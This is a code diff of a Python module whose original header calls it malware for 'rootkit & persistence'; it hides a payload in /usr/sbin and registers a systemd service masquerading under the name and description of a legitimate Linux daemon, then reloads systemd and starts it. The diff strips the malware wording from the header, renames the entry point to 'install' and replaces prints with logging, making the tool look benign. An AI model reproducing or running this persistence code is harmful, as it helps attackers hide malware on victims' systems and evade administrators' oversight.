@@ -1,11 +1,13 @@
-#Using Root Access, we will create a systemd service and hide the malware inside a 
-#Root-only folder. High level rootkit & persistence.
-#Author: Mitchell Nicholson
+"""
+systemdservice.py: A module for creating a systemd service and hiding the payload inside a root-only folder.
+"""
 
 import os
-import platform
-import random
 import shutil
+import random
+import logging
+import platform
+
 
 defaultServices = {
     'acpid': 'Advanced Configuration and Power Interface event daemon',
@@ -65,7 +67,7 @@ else:
 class createService:
     def __init__(self, payload):
         self.payload = payload
-    
+
     def _scanServices(self):
         #Had chat help me with this one
         # Connect to the system bus
@@ -88,7 +90,7 @@ class createService:
     def _chooseServices(self):
         validOptions = {}
         invalidOptions = []
-        curentServices = self._scanServices()	
+        curentServices = self._scanServices()
         #separating out the default services in use
         for service in curentServices:
             for default, description in defaultServices.items():
@@ -111,7 +113,7 @@ class createService:
             elif validCounter == len(invalidOptions):
                 validOptions[default] = description
             else:
-                print("Whoops, logic issue")
+                logging.info("Whoops, logic issue")
         #now that we have a dictionary of valid services to hide as
         #we will now be choosing one to hide as
         chosenOption = {}
@@ -119,7 +121,7 @@ class createService:
         chosenOption[list(validOptions)[randChoice]] = list(validOptions.values())[randChoice]
 
         return chosenOption
-            
+
 
     def _hideInRoot(self):
         #we will now hide the software in the /usr/sbin directory
@@ -138,7 +140,7 @@ class createService:
         names = [key for key in chosenOption]
         servName = names[0]+'.service'
         defaultFakeFile = '/etc/default/'+servName
-        sourceFile = '/lib/systemd/system/'+servName        
+        sourceFile = '/lib/systemd/system/'+servName
         username = os.environ.get('USER')
         psuedo_service = f"""[Unit]
 Description={description}
@@ -163,35 +165,37 @@ WantedBy=multi-user.target
         fakeFile = open(defaultFakeFile, 'w')
         fakeFile.write('# '+psuedo_service)
         fakeFile.close()
-        
+
     def _daemonReload(self):
         bus = dbus.SystemBus()
         manager_obj = bus.get_object("org.freedesktop.systemd1", "/org/freedesktop/systemd1")
         manager = dbus.Interface(manager_obj, "org.freedesktop.systemd1.Manager")
-        
+
         try:
             manager.Reload()
-            print("Systemd daemon reloaded successfully.")
+            logging.info("Systemd daemon reloaded successfully.")
         except dbus.exceptions.DBusException as e:
-            print("Failed to reload systemd daemon. Error: {}".format(str(e)))
-         
+            logging.info("Failed to reload systemd daemon. Error: {}".format(str(e)))
+
     def _startService(self, service_name):
         bus = dbus.SystemBus()
         manager_obj = bus.get_object("org.freedesktop.systemd1", "/org/freedesktop/systemd1")
         manager = dbus.Interface(manager_obj, "org.freedesktop.systemd1.Manager")
         try:
             manager.StartUnit("{0}.service".format(service_name), "replace")
-            print("Service '{0}' has been started.".format(service_name))
+            logging.info("Service '{0}' has been started.".format(service_name))
         except dbus.exceptions.DBusException as e:
-            print("Failed to start service '{0}'. Error: {1}".format(service_name, str(e)))
-         
-            
-    def sillySit(self):
+            logging.info("Failed to start service '{0}'. Error: {1}".format(service_name, str(e)))
+
+
+    def install(self):
         hidePath, hideName = self._hideInRoot()
-        print(hidePath)
-        print(hideName)
         servName = [key for key in hideName][0]
-        print(servName)
+
+        logging.info(f"Selected service: {servName}")
+        logging.info(f"Service description: {hideName[servName]}")
+        logging.info(f"Service path: {hidePath}")
+
         self._createService(hidePath, hideName)
         self._daemonReload()
         self._startService(servName)
